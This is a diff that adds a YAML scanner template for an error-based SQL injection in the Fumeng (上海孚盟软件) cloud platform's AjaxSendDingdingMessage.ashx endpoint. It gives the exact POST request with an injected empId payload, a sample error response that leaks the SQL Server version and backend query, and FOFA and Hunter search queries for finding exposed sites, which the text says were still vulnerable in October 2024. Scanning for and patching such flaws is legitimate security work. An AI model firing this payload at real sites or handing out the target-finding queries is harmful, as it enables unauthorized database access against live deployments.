@@ -1,0 +1,16 @@
+name: fmy-sqli       #上海孚盟软件
+rules: 
+  - method: POST               
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    path: /m/Dingding/Ajax/AjaxSendDingdingMessage.ashx
+    body: action=SendDingMeg_Mail&empId=2'+and+1=@@VERSION--+              
+    expression:                        
+      status_code:                  
+      response_header:              
+      response_body: 在将 nvarchar 值       #响应包{"Status":"E","Message":"在将 nvarchar 值 'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) \n\tApr  2 2010 15:48:46 \n\tCopyright (c) Microsoft Corporation\n\tDeveloper Edition (64-bit) on Windows NT 6.2 <X64> (Build 9200: )\n' 转换成数据类型 int 时失败。select ISNULL(IsDingTalkMailRemind,0) as IsCanSendMessage,Dingding,CNEmpName from bfemp where EmpId = '2' and 1=@@VERSION-- '"}            
+detail:                           
+  description: "上海孚盟软件主要是针对外贸客户提供轻量级的数字化解决方案。孚盟云平台AjaxSendDingdingMessage.ashx接口存在SQL注入漏洞,截至到2024.10.10部分网站仍存在该漏洞。"
+  search:             
+    fofa: body="hidLicResult" && body="hidProductID"
+    鹰图: web.body="hidLicResult" and web.body="hidProductID"
